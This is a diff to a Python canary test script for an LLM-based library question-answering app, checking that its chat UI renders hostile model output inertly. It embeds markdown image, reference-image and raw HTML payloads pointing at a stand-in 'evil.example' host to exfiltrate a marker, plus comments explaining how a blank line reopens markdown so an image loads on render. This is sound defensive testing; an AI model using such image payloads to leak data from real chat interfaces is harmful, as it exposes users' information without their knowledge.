@@ -36,9 +36,15 @@ mocked models only, and prove MECHANICS rather than a hosted model's resistance:
                      (the test can see a leak), a benign output BLOCKED.
   5 UI render path   the answer and the clarify question, carrying the marker
                      plus a markdown image, a reference image and raw HTML, go
-                     through ui.py's neutralization: nothing loads. Needs the ui
-                     extra; without it the stage reports SKIPPED and the run is
-                     INCOMPLETE, never PASSED.
+                     through ui.py's neutralization: nothing loads. The two
+                     fragments the UI builds as HTML itself are checked whole,
+                     on a broken quote and a stop reason that carry a blank line
+                     and an image reference: the provenance badge (headline and
+                     tooltip) and the metrics footer must hold neither a raw
+                     line break, which would end the HTML block and hand the
+                     rest back to the markdown renderer, nor an image. Needs the
+                     ui extra; without it the stage reports SKIPPED and the run
+                     is INCOMPLETE, never PASSED.
 
 Layer 2b (the last stage) is the live call — the ONLY paid one.
 
@@ -49,7 +55,8 @@ Exit codes: 0 pass, 1 FAILED (or a misbehaving control), 2 CONTAINED,
 3 INCOMPLETE (a stage was skipped; --allow-skipped downgrades it to 0).
 """
 import argparse
-import html
+import asyncio
+import contextlib
 import importlib
 import importlib.util
 import json
@@ -64,7 +71,7 @@ from ask_your_library import nodes
 from ask_your_library import llm
 from ask_your_library.i18n import t
 from ask_your_library.nodes import clarify, observe, reflect, synthesize
-from ask_your_library.sanitize import sanitize_context
+from ask_your_library.sanitize import LINE_BREAK_RE, sanitize_context
 
 REPO = Path(__file__).resolve().parents[1]
 
@@ -456,46 +463,121 @@ def detection_stage(_payloads: dict) -> tuple[str, None]:
 
 
 # ----------------------------------------------------- stage 5: UI path
+@contextlib.contextmanager
 def ui_module():
     """Import ui.py with the demo-login guards satisfied and everything it
     writes (secret file, chat db) pointed at a temp dir, never the repo's
-    .chainlit/. Mirrors the fixture in tests/test_ui.py."""
-    tmp = Path(tempfile.mkdtemp(prefix="ayl-canary-ui-"))
-    os.environ.setdefault("CHAINLIT_AUTH_SECRET", "canary-secret")
-    os.environ["AYL_ALLOW_DEFAULT_LOGIN"] = "1"
-    os.environ["AYL_CHAINLIT_DIR"] = str(tmp / "chainlit")
-    sys.path.insert(0, str(REPO))
-    sys.modules.pop("ui", None)
-    return importlib.import_module("ui")
+    .chainlit/. Mirrors the fixture in tests/test_ui.py.
+
+    A context manager because this file is also imported by the test suite: the
+    environment, sys.path and sys.modules go back to what they were, and the
+    temp directory is removed, instead of one stage rewriting a whole session's
+    process state and leaving a directory behind on every call."""
+    with tempfile.TemporaryDirectory(prefix="ayl-canary-ui-") as tmp:
+        secret = os.environ.get("CHAINLIT_AUTH_SECRET") or "canary-secret"
+        wanted = {"CHAINLIT_AUTH_SECRET": secret,
+                  "AYL_ALLOW_DEFAULT_LOGIN": "1",
+                  "AYL_CHAINLIT_DIR": str(Path(tmp) / "chainlit")}
+        before = {name: os.environ.get(name) for name in wanted}
+        os.environ.update(wanted)
+        sys.path.insert(0, str(REPO))
+        sys.modules.pop("ui", None)
+        try:
+            yield importlib.import_module("ui")
+        finally:
+            sys.modules.pop("ui", None)
+            with contextlib.suppress(ValueError):
+                sys.path.remove(str(REPO))
+            for name, value in before.items():
+                if value is None:
+                    os.environ.pop(name, None)
+                else:
+                    os.environ[name] = value
+
+
+# A blank line ends the HTML block a message is rendered as, so anything after
+# it is chat markdown again: an image there is fetched on render, with no click.
+# Both strings below carry that shape into the two places corpus and model text
+# reaches our own HTML: the badge's tooltip and the metrics footer.
+HOSTILE_LINES = (f"WARNING: 1 of 1 quotes NOT found verbatim:\n  - Poisoned Book: "
+                 f'"a quote"\n\n![pixel](https://evil.example/p?d={MARKER})')
+
+
+def assert_inert(html_text: str, where: str) -> None:
+    """What every rendered fragment of ours must satisfy: it stays one HTML
+    block (no raw line break can end it) and carries no image construct. Every
+    break form counts: CommonMark ends a block on a bare CR and on U+2028/U+0085
+    as well, so the check is the same expression the renderer uses."""
+    assert not LINE_BREAK_RE.search(html_text), \
+        f"UI: {where} carries a raw line break (it ends the HTML block)"
+    assert "![" not in html_text, f"UI: {where} carries an image construct"
+    assert "evil.example/p?d=" not in html_text, f"UI: {where} carries an image URL"
 
 
 def ui_stage(payloads: dict) -> tuple[str, None]:
     """The render path: an answer (and the clarify question) carrying the
     marker, a markdown image, a reference image and raw HTML must reach the
-    browser as text only — no third-party fetch happens on render."""
+    browser as text only — no third-party fetch happens on render. The badge
+    and the metrics footer are checked as whole rendered fragments, because
+    there the escape alone was not enough: they are HTML we build ourselves."""
     if importlib.util.find_spec("chainlit") is None:
         return ("UI render path: SKIPPED — the ui extra is not installed "
                 "(uv sync --extra ui)"), None
-    ui = ui_module()
+    with ui_module() as ui:
+        answer = (f"{MARKER} ![pixel](https://evil.example/p?d={MARKER}) "
+                  f'![ref][x] <img src="https://evil.example/i.png"> '
+                  "see [the book](https://example.org/x)\n\n[x]: https://evil.example/p")
+        rendered = ui.safe_markdown(answer)
+        assert "![" not in rendered, "UI: an image construct survived neutralization"
+        assert "[image removed]" in rendered, "UI: the inline image was not replaced"
+        assert "evil.example/p?d=" not in rendered, "UI: the inline image URL survived"
+        assert "<img" not in rendered and "&lt;img" in rendered, "UI: raw HTML reached the DOM"
+        assert "example.org" in rendered, \
+            "UI: an ordinary link was destroyed (needs a click, stays)"
+        assert MARKER in rendered, "UI: the text itself must still be shown, only inert"
 
-    answer = (f"{MARKER} ![pixel](https://evil.example/p?d={MARKER}) "
-              f'![ref][x] <img src="https://evil.example/i.png"> '
-              "see [the book](https://example.org/x)\n\n[x]: https://evil.example/p")
-    rendered = ui.neutralize_markdown(html.escape(answer, quote=False))
-    assert "![" not in rendered, "UI: an image construct survived neutralization"
-    assert "[image removed]" in rendered, "UI: the inline image was not replaced"
-    assert "evil.example/p?d=" not in rendered, "UI: the inline image URL survived"
-    assert "<img" not in rendered and "&lt;img" in rendered, "UI: raw HTML reached the DOM"
-    assert "example.org" in rendered, "UI: an ordinary link was destroyed (needs a click, stays)"
-    assert MARKER in rendered, "UI: the text itself must still be shown, only inert"
+        question = payloads.get("prompt_boundary_stage") or f"Which book? {FORGED_RESULT}{MARKER}"
+        shown = ui.safe_markdown(question)
+        assert "<result" not in shown and "&lt;result" in shown, \
+            "UI: a forged delimiter in a book title reached the DOM unescaped"
+        assert "![" not in shown, "UI: an image construct in the clarify question survived"
 
-    question = payloads.get("prompt_boundary_stage") or f"Which book? {FORGED_RESULT}{MARKER}"
-    shown = ui.neutralize_markdown(html.escape(question, quote=False))
-    assert "<result" not in shown and "&lt;result" in shown, \
-        "UI: a forged delimiter in a book title reached the DOM unescaped"
-    assert "![" not in shown, "UI: an image construct in the clarify question survived"
-    return ("UI render path (html.escape + neutralize_markdown on the answer and the clarify "
-            "question): no image loads, HTML escaped, links survive -> BLOCKED (controls ok)"), None
+        # The badge: the verification text is a fallback headline AND the
+        # tooltip of a title attribute, which no <br> may enter.
+        badge = ui.verification_badge({"verification": HOSTILE_LINES, "provenance": {}})
+        assert_inert(badge, "the badge")
+        assert "[image removed]" in badge, "UI: the badge did not neutralize the image"
+
+        # The metrics footer: the stop reason is written by reflect from the
+        # model's decision, and the model reads poisoned passages.
+        footer = []
+
+        class FakeChainlit:
+            """Only what show_metrics touches. Assigned on the module object
+            this block imported and thrown away with it, so the real chainlit
+            module is never patched."""
+            user_session = type("Session", (), {"get": staticmethod(lambda key: 0.0),
+                                                "set": staticmethod(lambda key, value: None)})()
+
+            class Message:
+                def __init__(self, content, **kwargs):
+                    footer.append(content)
+
+                async def send(self):
+                    return None
+
+        ui.cl = FakeChainlit
+        asyncio.run(ui.show_metrics({"model": "m", "cost_usd": 0.01, "seconds": 1,
+                                     "steps_taken": 1, "stop_reason": HOSTILE_LINES,
+                                     "llm_calls": 1, "input_tokens": 1, "output_tokens": 1,
+                                     "cache_read_tokens": 0, "by_role": {}, "hits_seen": 0,
+                                     "evidence_distilled": 0, "redacted_lines": 0}))
+        assert footer, "UI: the metrics footer was not rendered"
+        assert_inert(footer[0], "the metrics footer")
+    return ("UI render path (safe_markdown on the answer and the clarify "
+            "question; the badge tooltip and the metrics footer on a hostile broken quote and "
+            "stop reason): no image loads, HTML escaped, links survive -> BLOCKED "
+            "(controls ok)"), None
 
 
 # ----------------------------------------------------- stages 1-2 + driver
